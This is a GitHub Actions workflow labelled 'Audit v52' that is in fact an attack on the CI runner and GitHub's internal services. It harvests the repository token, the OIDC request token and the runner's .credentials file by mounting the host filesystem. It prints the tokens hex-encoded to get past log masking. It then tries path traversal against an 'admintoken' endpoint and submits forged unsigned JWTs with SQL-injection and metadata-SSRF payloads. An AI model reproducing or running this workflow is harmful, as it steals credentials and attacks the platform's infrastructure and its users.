name: Audit v52
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v52:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V52 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: EXPLOITING THE HTTP 204 ON ADMINTOKEN
      # v51: POST to admintoken returned 204 No Content!
      # Means the auth passed and SOME action was taken.
      # Need to try to get a 200 OK + Body back.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - HTTP 204 Exploitation
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== 204 EXPLOITATION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          VER="api-version=6.0-preview"

          # A: Request specific content types & responses
          echo "--- A: Upgrade 204 to 200 ---"
          for HEAD in \
            "Accept: application/json; $VER" \
            "Accept: text/plain; $VER" \
            "Accept: application/json; return=representation; $VER" \
            "Prefer: return=representation" \
            "Prefer: respond-async"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Content-Type: application/json" \
              -H "$HEAD" \
              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is \
              -d '{"poolId":1}' 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A $HEAD = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: Try passing return logic in query params
          echo "--- B: Query return modifiers ---"
          for QP in \
            "?includeToken=true" \
            "?returnRepresentation=true" \
            "?expand=token" \
            "?generate=true"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken$QP" --path-as-is \
              -d '{"poolId":1}' 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B $QP = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # C: Look for returned headers (maybe token is in headers?)
          echo "--- C: Response Headers ---"
          R=$(/usr/bin/curl -i -sS -X POST --connect-timeout 2 -m 3 \
            -H "Authorization: Bearer $IDTOK" \
            -H "Content-Type: application/json" \
            -H "Accept: application/json; $VER" \
            "$PIPE/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is \
            -d '{"poolId":1}' 2>/dev/null | head -15)
          echo "$R"
          echo ""

          # D: Hit ALL endpoints that gave 204 with different HTTP methods
          echo "--- D: 204 Endpoints Methods ---"
          for EP in "admintoken" "idtoken" "sessions" "agents" "events"; do
            for M in "GET" "PUT" "PATCH" "OPTIONS"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $M --connect-timeout 1 -m 2 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Content-Type: application/json" \
                -H "Accept: application/json; $VER" \
                "$PIPE/_apis/distributedtask/pools/..%2f$EP" --path-as-is \
                -d '{"poolId":1}' 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$BODY" != "null" ]; then
                echo "D $EP $M = $CODE | $(echo "$BODY" | head -c 150)"
              fi
            done
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: OAUTH2 DEEP AND JWT FIXES
      # v51: python syntax error fixed.
      # Fuzzing oauth2 to get token upgrades mapping runtime roles.
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - OAUTH2 JWT Fuzzing
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== OAUTH2 JWT FUZZING ==="
          IDTOK=$(cat /tmp/idtok.txt)

          python3 << 'PYEOF'
          import base64,json,subprocess,os
          def b64url(data):
            return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
          
          pipe="https://pipelinesghubeus14.actions.githubusercontent.com/ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          big_str="A"*5000
          
          # Fix: removed the backslashes dict definition inside f-string
          kid_payload = "' OR 1=1--"
          
          tests=[
            ("huge_sub", f"{b64url({'alg':'none'})}.{b64url({'sub':big_str})}."),
            ("x5c_inject", f"{b64url({'alg':'RS256','x5c':[big_str]})}.{b64url({'sub':'admin'})}."),
            ("kid_sqli", f"{b64url({'alg':'none','kid':kid_payload})}.{b64url({'sub':'admin'})}."),
            ("jku_ssrf", f"{b64url({'alg':'none','jku':'http://169.254.169.254/metadata/instance?api-version=2021-02-01'})}.{b64url({'sub':'admin'})}."),
            ("jwk_inject", f"{b64url({'alg':'none','jwk':{'kty':'RSA','n':'...','e':'AQAB'}})}.{b64url({'sub':'admin'})}."),
            ("idtok_sub", f"{b64url({'alg':'none'})}.{b64url({'sub':os.environ.get('IDTOK',''),'aud':'pipeline'})}."),
          ]
          
          for name,jwt in tests:
            r=subprocess.run(["/usr/bin/curl","-sS","-w","\\nHTTP_%{http_code}","-X","POST",
              "--connect-timeout","3","-m","5",
              "-H","Content-Type: application/x-www-form-urlencoded",
              f"{pipe}/_apis/oauth2/token",
              "-d",f"grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={jwt}"],
              capture_output=True,text=True,timeout=10)
            out=r.stdout.strip()
            lines=out.split('\n')
            code=lines[-1] if lines else "?"
            body='\n'.join(lines[:-1])
            print(f"B {name} = {code} | {body[:200]}")
          PYEOF

      # ══════════════════════════════════════════════════════════════
      # STEP 4: AZURE STORAGE VSTOKEN EXPLOITATION
      # Since we have the `tokenghubeus21` parent, what else is alive?
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Storage & Vstoken Scope
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== STORAGE VSTOKEN ==="
          IDTOK=$(cat /tmp/idtok.txt)
          PLAN=$(cat /tmp/plan.txt)
          
          # Direct Azure storage exploration using IDTOK as Bearer
          echo "--- A: Azure Storage with IDTOK ---"
          for URL in \
            "https://artifactcache.actions.githubusercontent.com/ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF" \
            "https://results-receiver.actions.githubusercontent.com"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Accept: application/json; api-version=6.0-preview" \
              "$URL/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            if [ "$BODY" != "null" ] && [ "$CODE" != "HTTP_404" ]; then
              echo "A $URL = $CODE | $(echo "$BODY" | head -c 150)"
            elif [ "$BODY" = "null" ]; then
              echo "A $URL = 200|null"
            fi
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V52 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V52 COMPLETE ==="
